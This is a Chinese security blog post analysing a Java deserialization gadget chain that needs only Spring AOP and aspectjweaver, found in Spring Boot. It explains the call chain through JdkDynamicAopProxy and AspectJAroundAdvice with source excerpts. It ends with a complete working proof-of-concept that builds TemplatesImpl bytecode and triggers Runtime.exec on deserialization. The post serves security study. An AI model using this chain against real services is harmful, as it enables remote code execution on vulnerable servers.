+++
date = '2025-01-23T23:33:31+08:00'
draft = false
title = 'SpringAOP链学习'
author='GSBP'
categories=["Java安全"]

+++

## 前言

在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下

## 正文

依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了

### 流程

调用链如下

```
JdkDynamicAopProxy.invoke()->
ReflectiveMethodInvocation.proceed()->
AspectJAroundAdvice->invoke->
org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()->
method.invoke()
```

执行类是`org.springframework.aop.aspectj.AbstractAspectJAdvice`的**invokeAdviceMethodWithGivenArgs**方法

![image-20250123020448769](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png)

```
    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
        Object[] actualArgs = args;
        if (this.aspectJAdviceMethod.getParameterCount() == 0) {
            actualArgs = null;
        }

        try {
            ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);
            return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
        } catch (IllegalArgumentException ex) {
            throw new AopInvocationException("Mismatch on arguments to advice method [" + this.aspectJAdviceMethod + "]; pointcut expression [" + this.pointcut.getPointcutExpression() + "]", ex);
        } catch (InvocationTargetException ex) {
            throw ex.getTargetException();
        }
    }
```

直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大

在他的实现子类，在他的子类基本上invoke(before)方法的都调用了他的`invokeAdviceMethod`方法的，所以我们只需要找到一个方法能够调用invoke(before)即可

![image-20250123021508701](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123021508701.png)

然后下一步找到了`ReflectiveMethodInvocation`类,他的proceed就能够满足我们上面的要求

![image-20250123021705034](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123021705034.png)

接下来在`JdkDynamicAopProxy`的invoke方法将会调用proceed方法

![image-20250123223723213](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123223723213.png)

这里有一点很有趣，就是`ReflectiveMethodInvocation`类是没有实现serializable接口的，所以我们不能将这个类放进我们的writeObject里面，但是在`JdkDynamicAopProxy`直接帮我们new了一个新的出来,也是很巧了

然后流程大致就是这样，接下来我们说一下payload执行中的一些知识点

### 构建payload中所需注意的

触发JdkDynamicAopProxy的invoke方法有很多种操作方式了，从invoke的触发流程来看，下面这俩method是肯定触发不了这条链子的，会提前return导致我们想要执行的代码没执行到

```
hashcode()
equals()
```

所以我们这里使用了平常非常常见的toString入口类



上面流程的图片也看到了，如果要走到proceed方法那里，那首先还得过一下`chain.isEmpty()`这个判断

chain由以下代码产生

```
List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
```

```
    public List<Object> getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class<?> targetClass) {
        MethodCacheKey cacheKey = new MethodCacheKey(method);
        List<Object> cached = (List)this.methodCache.get(cacheKey);
        if (cached == null) {
            cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);
            this.methodCache.put(cacheKey, cached);
        }

        return cached;
    }
```

因为`methodCache`由`transient`修饰，不能在反序列化中被恢复，所以这里的methodCache一开始一定为空，那我们就要看到`getInterceptorsAndDynamicInterceptionAdvice`方法了

`advisorChainFactory`对应的接口实现类只有`DefaultAdvisorChainFactory`，这里只能看看它的

```
public List<Object> getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class<?> targetClass) {
        AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();
        Advisor[] advisors = config.getAdvisors();
        List<Object> interceptorList = new ArrayList(advisors.length);
        Class<?> actualClass = targetClass != null ? targetClass : method.getDeclaringClass();
        Boolean hasIntroductions = null;

        for(Advisor advisor : advisors) {
            if (advisor instanceof PointcutAdvisor) {
                PointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;
                if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {
                    MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();
                    boolean match;
                    if (mm instanceof IntroductionAwareMethodMatcher) {
                        if (hasIntroductions == null) {
                            hasIntroductions = hasMatchingIntroductions(advisors, actualClass);
                        }

                        match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);
                    } else {
                        match = mm.matches(method, actualClass);
                    }

                    if (match) {
                        MethodInterceptor[] interceptors = registry.getInterceptors(advisor);
                        if (mm.isRuntime()) {
                            for(MethodInterceptor interceptor : interceptors) {
                                interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));
                            }
                        } else {
                            interceptorList.addAll(Arrays.asList(interceptors));
                        }
                    }
                }
            } else if (advisor instanceof IntroductionAdvisor) {
                IntroductionAdvisor ia = (IntroductionAdvisor)advisor;
                if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {
                    Interceptor[] interceptors = registry.getInterceptors(advisor);
                    interceptorList.addAll(Arrays.asList(interceptors));
                }
            } else {
                Interceptor[] interceptors = registry.getInterceptors(advisor);
                interceptorList.addAll(Arrays.asList(interceptors));
            }
        }

        return interceptorList;
    }
```

我们可以发现，不管是那种方式添加进入`interceptorList`的，其所对应的成员往往是从`registry.getInterceptors(advisor);`来的

那这里我们顺藤摸瓜,registry所对应的类是`DefaultAdvisorAdapterRegistry`

![image-20250123225810812](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123225810812.png)

对应的getInterceptors代码如下

![image-20250123225924866](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123225924866.png)

那这里我们只有从第一个判断口进入才能够添加interceptors，不过要求是我们的advisor必须实现了MethodInterceotor接口,简单看了一下继承关系，和文章师傅里得出的结论一样：没有同时实现了该接口的advisor类

面对此种情况，我们使用了动态代理去将`MethodInterceotor`给advisor类代理上，使其实现双接口

这里又用到了一次`JdkDynamicAopProxy`,不过和前面的作用完全不同



然后这里就能够顺利return回我们想要的interceptors,chain也能执行到我们的proceed方法了

最后就是在我们的`org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs`中

```
this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
```

这里还要从aspectInstanceFactory中获取到一个方法类的实例,文章中是使用了`SingletonAspectInstanceFactory`这个类

![image-20250123232655590](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123232655590.png)

和CC里的ConstantTransformer很相似



## POC

```

import Utils.Util;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;
import org.springframework.core.Ordered;

import java.lang.reflect.*;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class main {
    public static void main(String[] args) throws Exception {


        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Util.setFieldValue(templates, "_bytecodes", bytes);
        Util.setFieldValue(templates, "_name", "GSBP");
        Util.setFieldValue(templates, "_tfactory", null);
        Method method=templates.getClass().getMethod("newTransformer");//获取newTransformer方法

        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
        Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
        Util.setFieldValue(badAttributeValueExpException, "val", proxy1);
        Util.deserialize(Util.serialize(badAttributeValueExpException));

    }
    public static Object getBProxy(Object obj,Class[] clazzs) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
        return proxy;
    }
    public static Object getAProxy(Object obj,Class<?> clazz) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;

        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));
        advisedSupport.addAdvisor(advisor);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
        return proxy;
    }

}
```

![image-20250123233035882](https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123233035882.png)

## 参考文章

https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ